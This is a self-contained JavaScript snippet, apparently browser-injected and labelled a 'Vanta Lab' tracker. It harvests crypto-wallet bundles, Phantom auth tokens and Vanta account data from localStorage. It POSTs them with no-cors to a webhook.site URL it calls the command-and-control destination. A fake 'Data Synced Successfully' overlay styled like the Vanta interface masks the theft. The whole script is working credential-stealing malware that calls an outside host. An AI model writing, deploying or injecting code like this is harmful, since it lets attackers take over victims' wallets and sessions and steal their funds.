(function() {
    // 1. Setup - The "Command & Control" (C2) destination
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    
    console.log("%c[Vanta Lab] Tracker Active", "color: #00ff88; font-weight: bold;");

    // 2. The Extraction Logic (The "Scraper")
    const harvest = () => {
        return {
            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
            auth_tokens: localStorage.getItem('.phantom.auth.tokens'),
            vanta_accounts: localStorage.getItem('vanta_accounts'),
            host: window.location.hostname,
            timestamp: new Date().toLocaleString()
        };
    };

    // 3. The Exfiltration (The "Transmission")
    const exfiltrate = async (data) => {
        try {
            // Using 'no-cors' to avoid preflight (OPTIONS) checks that might be blocked
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            });
            
            // Visual feedback for the lab
            showNotification("Data Synced Successfully", "#00ff88");
        } catch (err) {
            showNotification("Sync Failed: CSP or Network Block", "#ff4444");
            console.error("Exfiltration error:", err);
        }
    };

    // 4. UI Overlay (1:1 Vanta Look)
    const showNotification = (msg, color) => {
        const notify = document.createElement('div');
        notify.style.cssText = `
            position: fixed; top: 10px; right: 10px; z-index: 10000;
            background: #111; color: ${color}; border: 1px solid ${color};
            padding: 15px; border-radius: 5px; font-family: 'Inter', sans-serif;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        `;
        notify.innerText = msg;
        document.body.appendChild(notify);
        setTimeout(() => notify.remove(), 3000);
    };

    // Execute
    const stolenData = harvest();
    exfiltrate(stolenData);
})();
